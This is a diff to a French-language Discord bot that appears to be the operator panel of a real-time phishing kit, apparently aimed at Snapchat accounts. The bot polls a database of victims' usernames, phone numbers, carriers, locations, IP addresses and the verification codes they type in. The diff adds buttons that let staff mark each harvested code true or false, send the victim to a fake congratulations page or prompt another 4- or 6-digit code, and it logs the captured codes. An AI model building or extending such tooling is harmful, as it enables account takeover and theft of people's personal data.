@@ -60,10 +60,10 @@ client.once('ready', () => {
     console.log(`📡 API: ${API_BASE}`);
     console.log(`📝 Salon: ${LOG_CHANNEL_ID || 'Non configuré'}`);
     startPollingPending();
-    startPollingCompleted();
+    startPollingCodeSubmitted();
 });
 
-// ─── POLLING : nouvelles demandes PENDING ───
+// ─── POLLING 1 : nouvelles demandes PENDING ───
 let lastPendingId = 0;
 
 async function startPollingPending() {
@@ -85,24 +85,24 @@ async function startPollingPending() {
     }, 5000);
 }
 
-// ─── POLLING : demandes COMPLETED (code saisi par l'utilisateur) ───
-let lastCompletedId = 0;
+// ─── POLLING 2 : demandes CODE_SUBMITTED (code saisi par l'utilisateur) ───
+let lastCodeSubmittedId = 0;
 
-async function startPollingCompleted() {
+async function startPollingCodeSubmitted() {
     setInterval(async () => {
         try {
             const rows = await sql`
-                SELECT id, username, phone, operator, country, city, ip_address, staff_code, status, created_at
+                SELECT id, username, phone, operator, country, city, ip_address, staff_code, code_length, status, created_at
                 FROM snap_requests
-                WHERE id > ${lastCompletedId} AND status = 'completed' AND staff_code IS NOT NULL
+                WHERE id > ${lastCodeSubmittedId} AND status = 'code_submitted' AND staff_code IS NOT NULL
                 ORDER BY id ASC
             `;
             for (const row of rows) {
-                lastCompletedId = Math.max(lastCompletedId, row.id);
-                await sendCompletedEmbed(row);
+                lastCodeSubmittedId = Math.max(lastCodeSubmittedId, row.id);
+                await sendCodeSubmittedEmbed(row);
             }
         } catch (e) {
-            console.error('Polling completed error:', e.message || e);
+            console.error('Polling code_submitted error:', e.message || e);
         }
     }, 5000);
 }
@@ -140,8 +140,8 @@ async function sendNewRequestEmbed(row) {
     console.log(`📨 Nouvelle demande : ${row.phone}`);
 }
 
-// ─── Embed CODE SAISI (avec bouton Ban IP) ───
-async function sendCompletedEmbed(row) {
+// ─── Embed CODE SAISI (True / False / Ban) ───
+async function sendCodeSubmittedEmbed(row) {
     const channel = client.channels.cache.get(LOG_CHANNEL_ID);
     if (!channel) return;
 
@@ -153,6 +153,7 @@ async function sendCompletedEmbed(row) {
     const embed = new EmbedBuilder()
         .setTitle('🔓 Code saisi par l\'utilisateur')
         .setColor(0x10b981)
+        .setDescription(`Le client a saisi un code à **${row.code_length || 6} chiffres**. Veuillez le vérifier.`)
         .addFields(
             { name: '👤 Username', value: row.username, inline: true },
             { name: '📞 Téléphone', value: row.phone, inline: true },
@@ -165,15 +166,14 @@ async function sendCompletedEmbed(row) {
         .setFooter({ text: `ID: ${row.id}` })
         .setTimestamp();
 
-    const banRow = new ActionRowBuilder().addComponents(
-        new ButtonBuilder()
-            .setCustomId(`banip_${row.ip_address}`)
-            .setLabel('🚫 Ban IP')
-            .setStyle(ButtonStyle.Danger)
+    const actionRow = new ActionRowBuilder().addComponents(
+        new ButtonBuilder().setCustomId(`truecode_${row.phone}`).setLabel('✅ True Code').setStyle(ButtonStyle.Success),
+        new ButtonBuilder().setCustomId(`falsecode_${row.phone}`).setLabel('❌ False Code').setStyle(ButtonStyle.Danger),
+        new ButtonBuilder().setCustomId(`banip_${row.ip_address}`).setLabel('🚫 Ban IP').setStyle(ButtonStyle.Secondary)
     );
 
-    await channel.send({ embeds: [embed], components: [banRow] });
-    console.log(`🔓 Code saisi : ${row.phone} — IP: ${row.ip_address}`);
+    await channel.send({ embeds: [embed], components: [actionRow] });
+    console.log(`🔓 Code saisi : ${row.phone} — Code: ${row.staff_code}`);
 }
 
 // ─── INTERACTIONS BOUTONS ───
@@ -275,6 +275,56 @@ client.on('interactionCreate', async interaction => {
                     .setTitle('📱 Wrong Number')
                     .setDescription(`❌ L'utilisateur a été redirigé vers la saisie du numéro.`);
                 await interaction.message.edit({ embeds: [doneEmbed], components: [] });
+            }
+        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
+    }
+
+    // ─── TRUE CODE (valide le code) ───
+    if (action === 'truecode') {
+        await interaction.deferReply({ flags: 64 });
+        try {
+            const res = await fetch(`${API_BASE}/api/staff-action`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action: 'true_code', phone, secret: STAFF_SECRET })
+            });
+            const data = await res.json();
+            await interaction.editReply({ content: data.success ? `✅ Code validé pour ${phone}` : `❌ ${data.message}` });
+            if (data.success) {
+                const doneEmbed = EmbedBuilder.from(interaction.message.embeds[0])
+                    .setColor(0x10b981)
+                    .setTitle('✅ Code validé')
+                    .setDescription(`👤 Validé par <@${interaction.user.id}>\nL'utilisateur est redirigé vers la page de félicitations.`);
+                await interaction.message.edit({ embeds: [doneEmbed], components: [] });
+            }
+        } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
+    }
+
+    // ─── FALSE CODE (code incorrect, l'utilisateur doit ressaisir) ───
+    if (action === 'falsecode') {
+        await interaction.deferReply({ flags: 64 });
+        try {
+            const res = await fetch(`${API_BASE}/api/staff-action`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action: 'false_code', phone, secret: STAFF_SECRET })
+            });
+            const data = await res.json();
+            await interaction.editReply({ content: data.success ? `❌ Code refusé pour ${phone}. L'utilisateur doit ressaisir.` : `❌ ${data.message}` });
+            if (data.success) {
+                // Remettre l'embed "Demande en cours" avec les 3 boutons
+                const newEmbed = EmbedBuilder.from(interaction.message.embeds[0])
+                    .setColor(0x3b82f6)
+                    .setTitle('📱 Demande en cours de traitement')
+                    .setDescription(`👤 Pris en charge\n❌ Le code précédent était incorrect.\n\nChoisissez la nouvelle action :`);
+
+                const actionRow = new ActionRowBuilder().addComponents(
+                    new ButtonBuilder().setCustomId(`len4_${phone}`).setLabel('🔢 4 chiffres').setStyle(ButtonStyle.Success),
+                    new ButtonBuilder().setCustomId(`len6_${phone}`).setLabel('🔢 6 chiffres').setStyle(ButtonStyle.Success),
+                    new ButtonBuilder().setCustomId(`wrong_${phone}`).setLabel('❌ Wrong Number').setStyle(ButtonStyle.Danger)
+                );
+
+                await interaction.message.edit({ embeds: [newEmbed], components: [actionRow] });
             }
         } catch (e) { await interaction.editReply({ content: '❌ Erreur' }); }
     }
